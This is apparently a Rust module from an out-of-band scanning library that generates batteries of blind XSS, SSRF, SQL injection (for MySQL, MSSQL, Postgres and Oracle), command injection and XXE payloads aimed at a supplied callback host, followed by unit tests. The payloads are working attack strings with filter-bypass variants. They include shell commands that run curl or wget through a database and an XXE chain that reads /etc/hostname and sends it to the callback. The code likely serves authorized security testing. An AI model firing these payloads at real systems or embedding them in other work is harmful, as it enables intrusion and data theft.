//! Blind-vulnerability payload helpers parameterized by an
//! out-of-band callback URL or DNS name.
//!
//! Each helper returns a [`Vec<String>`] of payload variants suitable
//! for blasting through wafrift's mutation pipeline / scald's injection
//! point inventory: a single payload class (blind XSS, blind SSRF,
//! etc.) expands into many on-the-wire forms so a single WAF / filter
//! / context mismatch doesn't blind the whole confirmation step.
//!
//! ## Why this lives in interactsh-client
//!
//! The helpers are intentionally **OOB-server-agnostic**: every
//! template takes a `callback_url` / `callback_dns` parameter rather
//! than holding a [`crate::InteractshClient`] reference. The same
//! batteries therefore work with:
//!
//! - interactsh (`callback_url = client.generate_url(...).url`)
//! - Burp Collaborator
//! - self-hosted DNS catchers
//! - benchmark/test mock catchers
//!
//! Returning owned `Vec<String>`s rather than borrowed views keeps the
//! API trivially `Send`-friendly: scanners can shove a battery onto a
//! `tokio::spawn`'d task without lifetime gymnastics.
//!
//! ## Variant count
//!
//! Every battery is deliberately at least 5 variants. That number is
//! the empirical minimum where a single WAF / parser quirk (case
//! folding, attribute boundary, comment-style preference, URL-encoding
//! depth) doesn't silently shut the whole class out: a single template
//! has 1× the variance of a 5-template battery, so a battery's *worst*
//! case (every variant blocked) is still rarer than a single template
//! being blocked.

use std::collections::BTreeSet;

/// Returns a battery of blind XSS payload variants that all fire a
/// request to `callback_url`.
///
/// Covers `<script>`, `<img onerror=>`, `<svg onload=>`, `<iframe>`,
/// `<object data=>`, `<video>`, javascript-protocol `<a href=>`, and
/// `<input onfocus autofocus>`: the eight events that survive most
/// HTML sanitizers AND most modern browser default-deny lists.
///
/// # Parameters
///
/// - `callback_url`: Absolute URL the embedded script / asset
///   should request. Typically `interactsh_client::InteractshClient::generate_url(...).url`
///   wrapped in `http://` / `https://`.
///
/// # Returns
///
/// Returns at least 8 deduped payload strings.
#[must_use]
pub fn blind_xss_payloads(callback_url: &str) -> Vec<String> {
    let (_, full_url) = callback_forms(callback_url);
    let mut out: BTreeSet<String> = BTreeSet::new();
    out.insert(format!("<script src=\"{full_url}\"></script>"));
    out.insert(format!("<script>fetch('{full_url}')</script>"));
    out.insert(format!("<img src=x onerror=\"fetch('{full_url}')\">"));
    out.insert(format!("<svg/onload=fetch('{full_url}')>"));
    out.insert(format!(
        "<iframe src=\"javascript:fetch('{full_url}')\"></iframe>"
    ));
    out.insert(format!("<object data=\"{full_url}\"></object>"));
    out.insert(format!(
        "<video><source onerror=\"fetch('{full_url}')\"></video>"
    ));
    out.insert(format!("<input autofocus onfocus=\"fetch('{full_url}')\">"));
    // Bonus: encoded variant for filters that strip the literal '<script'
    out.insert(format!("<a href=\"javascript:fetch('{full_url}')\">x</a>"));
    out.into_iter().collect()
}

/// Returns a battery of blind SSRF payload variants pointing at
/// `callback_url`.
///
/// Covers raw URL, URL inside JSON `{"url":...}`, URL inside form
/// body, URL with `redirect_uri=` / `next=` parameter wrappers, and
/// gopher-protocol upgrade. The `gopher://` and `dict://` variants
/// catch curl-based fetchers that the WAF only filters on `http://`.
#[must_use]
pub fn blind_ssrf_payloads(callback_url: &str) -> Vec<String> {
    let (_, full_url) = callback_forms(callback_url);
    let mut out: BTreeSet<String> = BTreeSet::new();
    out.insert(full_url.clone());
    out.insert(format!("{{\"url\": \"{full_url}\"}}"));
    out.insert(format!("redirect_uri={full_url}"));
    out.insert(format!("next={full_url}"));
    out.insert(format!("url={full_url}"));
    // gopher:// upgrades to bare TCP via curl; reaches Redis / memcached
    // / mailman setups that an http:// fetch wouldn't. Rewrite whatever scheme
    // the callback carries (a bare `replacen("http://", ..)` silently no-ops on
    // an https:// callback, collapsing every variant into the raw entry).
    out.insert(with_scheme(&full_url, "gopher"));
    out.insert(with_scheme(&full_url, "dict"));
    // file://-style (confirms the fetcher allows file scheme (RCE pivot)).
    out.insert(with_scheme(&full_url, "file"));
    out.into_iter().collect()
}

/// Rewrites the scheme of `url` to `new_scheme`, regardless of the original
/// scheme (`http`, `https`, or anything else). Returns `{new_scheme}://{rest}`;
/// a schemeless input is prepended so a bare host still yields a
/// scheme-qualified payload. ONE-PLACE for SSRF scheme upgrades so an https://
/// callback still produces gopher/dict/file variants instead of silently
/// no-op'ing and deduping away.
fn with_scheme(url: &str, new_scheme: &str) -> String {
    match url.split_once("://") {
        Some((_scheme, rest)) => format!("{new_scheme}://{rest}"),
        None => format!("{new_scheme}://{url}"),
    }
}

/// SQL dialect identifier for [`blind_sqli_payloads`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum SqliDialect {
    /// `MySQL` / `MariaDB`: `LOAD_FILE('\\\\host\\share')` SMB exfil.
    MySql,
    /// MSSQL: `xp_dirtree '\\\\host\\share'` UNC path resolution.
    MsSql,
    /// `PostgreSQL`: `COPY ... FROM PROGRAM 'curl URL'`.
    Postgres,
    /// Oracle: `UTL_HTTP.request('http://host/')`.
    Oracle,
}

/// Derive the two callback forms a SQL injection sink may need from one caller input.
///
/// `bare_host` is the DNS host alone (scheme, path, and port stripped), for
/// UNC/SMB paths and hostname-only sinks (`DBMS_LDAP.init`, `UTL_INADDR`).
/// `full_url` always carries a scheme (`http://` is prepended when the caller
/// passed a bare host), for URL sinks (`curl`, `wget`, `UTL_HTTP`,
/// `HTTPURITYPE`). Deriving both means every template is well-formed no matter
/// which form the caller supplied, instead of half the variants coming out
/// malformed (a bare host in `UTL_HTTP.request`, or `\\http://host/\a` in a
/// UNC path).
fn callback_forms(callback: &str) -> (String, String) {
    let after_scheme = callback
        .split_once("://")
        .map_or(callback, |(_scheme, rest)| rest);
    let authority = after_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after_scheme);
    let bare_host = authority.split(':').next().unwrap_or(authority).to_string();
    let full_url = if callback.contains("://") {
        callback.to_string()
    } else {
        format!("http://{callback}")
    };
    (bare_host, full_url)
}

/// Returns a battery of blind SQL injection payload variants that exfiltrate
/// over the network for `dialect`.
///
/// `callback` may be a bare DNS host (`abc.oob.example`) or a full URL
/// (`http://abc.oob.example/`); each template embeds whichever form it needs,
/// derived via `callback_forms`, so every emitted payload is well-formed.
#[must_use]
pub fn blind_sqli_payloads(callback: &str, dialect: SqliDialect) -> Vec<String> {
    let (bare_host, full_url) = callback_forms(callback);
    let mut out: BTreeSet<String> = BTreeSet::new();
    match dialect {
        SqliDialect::MySql => {
            // SMB / UNC exfil: server resolves the UNC and queries DNS.
            out.insert(format!(
                "' UNION SELECT LOAD_FILE('\\\\\\\\{bare_host}\\\\a') -- "
            ));
            out.insert(format!(
                "1 AND (SELECT LOAD_FILE('\\\\\\\\{bare_host}\\\\a')) -- "
            ));
            // Stacked query DNS via SMB.
            out.insert(format!(
                "1; SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{bare_host}', '\\\\a')) -- "
            ));
            // sleep + side channel for time-blind confirmation.
            out.insert(format!(
                "' UNION SELECT IF(1=1, LOAD_FILE('\\\\\\\\{bare_host}\\\\a'), 1) -- "
            ));
            out.insert(format!(
                "' AND ASCII(SUBSTRING((SELECT LOAD_FILE('\\\\\\\\{bare_host}\\\\a')),1,1))=0 -- "
            ));
        }
        SqliDialect::MsSql => {
            out.insert(format!("'; EXEC xp_dirtree '\\\\{bare_host}\\a' -- "));
            out.insert(format!(
                "'; EXEC master..xp_fileexist '\\\\{bare_host}\\a' -- "
            ));
            out.insert(format!(
                "'; EXEC master..xp_subdirs '\\\\{bare_host}\\' -- "
            ));
            out.insert(format!(
                "'; DECLARE @x VARCHAR(255); SET @x = '\\\\{bare_host}\\a'; EXEC xp_dirtree @x -- "
            ));
            out.insert(format!(
                "' UNION SELECT * FROM OPENROWSET('SQLOLEDB', '\\\\{bare_host}\\share';'sa';'pwd', 'SELECT 1') -- "
            ));
        }
        SqliDialect::Postgres => {
            // curl / wget need a full URL; dblink host= and pg_read_file UNC
            // need the bare host.
            out.insert(format!(
                "'; COPY (SELECT '') TO PROGRAM 'curl {full_url}' -- "
            ));
            out.insert(format!(
                "'; COPY (SELECT '') TO PROGRAM 'wget {full_url}' -- "
            ));
            out.insert(format!(
                "'; CREATE TABLE oob(t text); COPY oob FROM PROGRAM 'curl {full_url}' -- "
            ));
            out.insert(format!(
                "'; DO $$ BEGIN PERFORM dblink_connect('host={bare_host}'); END $$ -- "
            ));
            out.insert(format!("'; SELECT pg_read_file('\\\\{bare_host}\\a') -- "));
        }
        SqliDialect::Oracle => {
            // UTL_HTTP / HTTPURITYPE need a full URL; DBMS_LDAP.init and
            // UTL_INADDR take a bare hostname.
            out.insert(format!("' || UTL_HTTP.request('{full_url}') || '"));
            out.insert(format!(
                "' || (SELECT UTL_HTTP.request('{full_url}') FROM DUAL) || '"
            ));
            out.insert(format!("' || DBMS_LDAP.init('{bare_host}',80) || '"));
            out.insert(format!(
                "' || (SELECT HTTPURITYPE('{full_url}').getcontent() FROM DUAL) || '"
            ));
            out.insert(format!(
                "' || UTL_INADDR.get_host_address('{bare_host}') || '"
            ));
        }
    }
    out.into_iter().collect()
}

/// Returns a battery of blind command-injection payload variants
/// that perform a DNS lookup or HTTP request to `callback_dns`.
///
/// Covers `nslookup`, `dig`, `curl`, `wget`, `ping`, and PowerShell
/// `Resolve-DnsName` so both Unix and Windows shells trigger.
/// Variants include separators (`;`, `&`, `|`, backtick, `$()`) so a
/// filter rejecting one separator is bypassed by another.
#[must_use]
pub fn blind_cmdi_payloads(callback_dns: &str) -> Vec<String> {
    let (bare_host, full_url) = callback_forms(callback_dns);
    let mut out: BTreeSet<String> = BTreeSet::new();
    // Unix: nslookup, dig, curl, wget with various separators.
    out.insert(format!("; nslookup {bare_host}"));
    out.insert(format!("&& nslookup {bare_host}"));
    out.insert(format!("| nslookup {bare_host}"));
    out.insert(format!("`nslookup {bare_host}`"));
    out.insert(format!("$(nslookup {bare_host})"));
    out.insert(format!("; dig {bare_host}"));
    out.insert(format!("; curl {full_url}"));
    out.insert(format!("; wget {full_url}"));
    out.insert(format!("; ping -c 1 {bare_host}"));
    // Windows: PowerShell + ping with appropriate quoting.
    out.insert(format!("& powershell -c \"Resolve-DnsName {bare_host}\""));
    out.insert(format!("& ping -n 1 {bare_host}"));
    // Anti-filter: embed DNS in a $() with extra noise.
    out.insert(format!("`{{nslookup,{bare_host}}}`"));
    out.into_iter().collect()
}

/// Returns a battery of blind XXE payload variants that exfiltrate
/// via DNS / HTTP to `callback_url`.
///
/// Each payload is a complete XML document, drop into a request
/// body where `Content-Type: application/xml` is accepted.
/// Variants cover inline DTD, parameter-entity OOB, blind error-based
/// (server's parser error message includes the entity expansion), and
/// SVG-wrapped XXE.
#[must_use]
pub fn blind_xxe_payloads(callback_url: &str) -> Vec<String> {
    let (_, full_url) = callback_forms(callback_url);
    let mut out: BTreeSet<String> = BTreeSet::new();
    out.insert(format!(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{full_url}\">]><foo>&xxe;</foo>"
    ));
    // Parameter-entity OOB chain (the classic blind XXE recipe).
    out.insert(format!(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{full_url}\"> %xxe;]><foo/>"
    ));
    // Error-based blind XXE (Java parsers leak the entity in the error).
    out.insert(format!(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % oob \"<!ENTITY &#x25; payload SYSTEM '{full_url}?x=%file;'>\"> %oob; %payload;]><foo/>"
    ));
    // SVG wrapper (uploaded as image, server-side parsed).
    out.insert(format!(
        "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{full_url}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
    ));
    // SOAP envelope for soap endpoints.
    out.insert(format!(
        "<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"{full_url}\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&xxe;</soap:Body></soap:Envelope>"
    ));
    out.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_all_contain(payloads: &[String], needle: &str) {
        for (i, p) in payloads.iter().enumerate() {
            assert!(p.contains(needle), "payload {i} '{p}' missing '{needle}'");
        }
    }

    fn assert_dedup(payloads: &[String]) {
        let set: BTreeSet<&String> = payloads.iter().collect();
        assert_eq!(set.len(), payloads.len(), "battery contains duplicates");
    }

    #[test]
    fn blind_xss_battery_meets_min_variant_count_and_carries_callback() {
        let p = blind_xss_payloads("http://oob.test/x");
        assert!(p.len() >= 8);
        assert_all_contain(&p, "http://oob.test/x");
        assert_dedup(&p);
    }

    #[test]
    fn blind_xss_covers_distinct_tag_surfaces() {
        let p = blind_xss_payloads("http://oob.test/x");
        let surfaces = ["<script", "<img", "<svg", "<iframe", "<object", "<video"];
        for surface in surfaces {
            assert!(
                p.iter().any(|s| s.contains(surface)),
                "XSS battery missing surface {surface}"
            );
        }
    }

    #[test]
    fn blind_ssrf_battery_includes_scheme_pivots() {
        let p = blind_ssrf_payloads("http://oob.test/x");
        assert!(p.iter().any(|s| s.starts_with("gopher://")));
        assert!(p.iter().any(|s| s.starts_with("dict://")));
        assert!(p.iter().any(|s| s.starts_with("file://")));
        assert!(p.iter().any(|s| s.contains("redirect_uri=")));
        assert!(p.iter().any(|s| s.contains("\"url\"")));
        assert_dedup(&p);
    }

    #[test]
    fn blind_ssrf_scheme_pivots_work_on_https_callback() {
        // Regression for payload_helpers.rs:96: a bare replacen("http://", ..)
        // no-ops on an https:// callback, collapsing gopher/dict/file into the
        // raw entry. with_scheme rewrites whatever scheme is present.
        let p = blind_ssrf_payloads("https://oob.test/x");
        assert!(
            p.iter().any(|s| s == "gopher://oob.test/x"),
            "expected gopher variant rewritten from https, got {p:?}"
        );
        assert!(p.iter().any(|s| s == "dict://oob.test/x"));
        assert!(p.iter().any(|s| s == "file://oob.test/x"));
        // The three scheme pivots must be distinct entries, not deduped away.
        let pivots = p
            .iter()
            .filter(|s| {
                s.starts_with("gopher://") || s.starts_with("dict://") || s.starts_with("file://")
            })
            .count();
        assert_eq!(
            pivots, 3,
            "all three scheme pivots must survive dedup: {p:?}"
        );
        assert_dedup(&p);
    }

    #[test]
    fn blind_sqli_mysql_uses_load_file_and_unc() {
        let p = blind_sqli_payloads("oob.test", SqliDialect::MySql);
        assert!(p.len() >= 5);
        assert_all_contain(&p, "oob.test");
        for s in &p {
            assert!(
                s.contains("LOAD_FILE") || s.contains("ASCII"),
                "MySQL variant missing LOAD_FILE / ASCII: {s}"
            );
        }
        assert_dedup(&p);
    }

    #[test]
    fn blind_sqli_mssql_uses_xp_dirtree_or_openrowset() {
        let p = blind_sqli_payloads("oob.test", SqliDialect::MsSql);
        assert!(p.len() >= 5);
        for s in &p {
            assert!(
                s.contains("xp_dirtree")
                    || s.contains("xp_fileexist")
                    || s.contains("xp_subdirs")
                    || s.contains("OPENROWSET"),
                "MSSQL variant missing OOB primitive: {s}"
            );
        }
        assert_dedup(&p);
    }

    #[test]
    fn blind_sqli_postgres_uses_copy_program_or_dblink() {
        let p = blind_sqli_payloads("http://oob.test/", SqliDialect::Postgres);
        assert!(p.len() >= 5);
        for s in &p {
            assert!(
                s.contains("COPY") || s.contains("dblink_connect") || s.contains("pg_read_file"),
                "Postgres variant missing OOB primitive: {s}"
            );
        }
        assert_dedup(&p);
    }

    #[test]
    fn blind_sqli_oracle_uses_utl_http_or_dbms_ldap() {
        let p = blind_sqli_payloads("http://oob.test/", SqliDialect::Oracle);
        assert!(p.len() >= 5);
        for s in &p {
            assert!(
                s.contains("UTL_HTTP")
                    || s.contains("DBMS_LDAP")
                    || s.contains("HTTPURITYPE")
                    || s.contains("UTL_INADDR"),
                "Oracle variant missing OOB primitive: {s}"
            );
        }
        assert_dedup(&p);
    }

    #[test]
    fn blind_sqli_oracle_derives_full_url_from_bare_host() {
        // A bare host must still produce a well-formed UTL_HTTP (needs a scheme)
        // and bare-host DBMS_LDAP/UTL_INADDR (must NOT gain a scheme).
        let p = blind_sqli_payloads("oob.test", SqliDialect::Oracle);
        let utl_http = p
            .iter()
            .find(|s| s.contains("UTL_HTTP.request"))
            .expect("UTL_HTTP variant present");
        assert!(
            utl_http.contains("UTL_HTTP.request('http://oob.test')"),
            "UTL_HTTP must receive a full URL even from a bare host: {utl_http}"
        );
        let ldap = p
            .iter()
            .find(|s| s.contains("DBMS_LDAP.init"))
            .expect("DBMS_LDAP variant present");
        assert!(
            ldap.contains("DBMS_LDAP.init('oob.test',80)"),
            "DBMS_LDAP.init must receive a bare host, not a URL: {ldap}"
        );
    }

    #[test]
    fn blind_sqli_mysql_strips_scheme_and_port_from_full_url() {
        // A full URL must not leak a scheme/port/path into a UNC path
        // (`\\http://host:8080/path\a` is malformed); the bare host is derived.
        let p = blind_sqli_payloads("http://oob.test:8080/path", SqliDialect::MySql);
        for s in &p {
            assert!(
                !s.contains("://"),
                "UNC payload must not contain a scheme: {s}"
            );
            assert!(
                s.contains("oob.test"),
                "UNC payload must contain the bare host: {s}"
            );
            assert!(
                !s.contains("8080") && !s.contains("path"),
                "UNC payload must drop port and path: {s}"
            );
        }
    }

    #[test]
    fn blind_sqli_postgres_mixes_full_url_and_bare_host_correctly() {
        // From a bare host: curl gets a scheme; pg_read_file UNC and dblink
        // host= get the bare host with no scheme.
        let p = blind_sqli_payloads("oob.test", SqliDialect::Postgres);
        let curl = p
            .iter()
            .find(|s| s.contains("curl "))
            .expect("curl variant present");
        assert!(
            curl.contains("curl http://oob.test"),
            "curl needs a full URL: {curl}"
        );
        let unc = p
            .iter()
            .find(|s| s.contains("pg_read_file"))
            .expect("pg_read_file variant present");
        assert!(
            !unc.contains("://"),
            "pg_read_file UNC must have no scheme: {unc}"
        );
        let dblink = p
            .iter()
            .find(|s| s.contains("dblink_connect"))
            .expect("dblink variant present");
        assert!(
            dblink.contains("host=oob.test"),
            "dblink needs a bare host: {dblink}"
        );
    }

    #[test]
    fn blind_cmdi_covers_unix_and_windows_separators() {
        let p = blind_cmdi_payloads("oob.test");
        assert!(p.len() >= 10);
        // Unix separators
        assert!(p.iter().any(|s| s.starts_with(';')));
        assert!(p.iter().any(|s| s.starts_with("&&")));
        assert!(p.iter().any(|s| s.starts_with('|')));
        // Subshell forms
        assert!(p.iter().any(|s| s.starts_with('`')));
        assert!(p.iter().any(|s| s.starts_with("$(")));
        // Windows
        assert!(p.iter().any(|s| s.contains("powershell")));
        assert_all_contain(&p, "oob.test");
        assert_dedup(&p);
    }

    #[test]
    fn blind_xxe_includes_parameter_entity_chain() {
        let p = blind_xxe_payloads("http://oob.test/");
        assert!(p.len() >= 5);
        assert_all_contain(&p, "http://oob.test/");
        // Param-entity chain is the canonical blind XXE form.
        assert!(p.iter().any(|s| s.contains("<!ENTITY %")));
        // SVG wrapper (image-upload context).
        assert!(p.iter().any(|s| s.contains("<svg")));
        // SOAP wrapper.
        assert!(p.iter().any(|s| s.contains("soap:Envelope")));
        assert_dedup(&p);
    }

    #[test]
    fn callback_url_with_special_chars_is_embedded_verbatim() {
        // bugcrowd / interactsh URLs often have query strings &
        // base64 nonces. Verify we don't accidentally escape them
        // (the OOB server expects the bytes verbatim for correlation).
        let url = "http://abc-def.oast.fun/?id=xyz&foo=bar";
        let p = blind_xss_payloads(url);
        assert_all_contain(&p, url);
    }
    #[test]
    fn blind_cmdi_derives_bare_host_from_full_url() {
        let p = blind_cmdi_payloads("http://oob.test:8080/path");
        let nslookup = p
            .iter()
            .find(|s| s.contains("nslookup "))
            .expect("nslookup variant present");
        assert!(
            nslookup.contains("nslookup oob.test"),
            "nslookup must receive bare host, got: {nslookup}"
        );
        let curl = p
            .iter()
            .find(|s| s.contains("curl "))
            .expect("curl variant present");
        assert!(
            curl.contains("curl http://oob.test:8080/path"),
            "curl must receive full url, got: {curl}"
        );
    }
    #[test]
    fn blind_xss_derives_full_url_from_bare_host() {
        let p = blind_xss_payloads("oob.test");
        assert_all_contain(&p, "http://oob.test");
        assert!(p.iter().all(|s| !s.contains("src=\"oob.test\"")));
    }

    #[test]
    fn blind_ssrf_derives_full_url_from_bare_host() {
        let p = blind_ssrf_payloads("oob.test");
        assert!(p.iter().any(|s| s == "http://oob.test"));
        assert!(p.iter().any(|s| s == "gopher://oob.test"));
        assert!(p.iter().any(|s| s == "redirect_uri=http://oob.test"));
    }

    #[test]
    fn blind_xxe_derives_full_url_from_bare_host() {
        let p = blind_xxe_payloads("oob.test");
        assert_all_contain(&p, "http://oob.test");
        assert!(p.iter().all(|s| !s.contains("SYSTEM \"oob.test\"")));
    }
}
